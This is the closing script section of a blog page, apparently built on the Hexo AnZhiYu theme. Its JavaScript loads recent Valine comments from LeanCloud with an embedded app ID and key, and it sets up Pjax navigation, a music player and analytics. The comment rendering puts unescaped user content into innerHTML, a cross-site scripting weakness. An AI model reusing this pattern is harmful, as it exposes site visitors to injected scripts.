    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>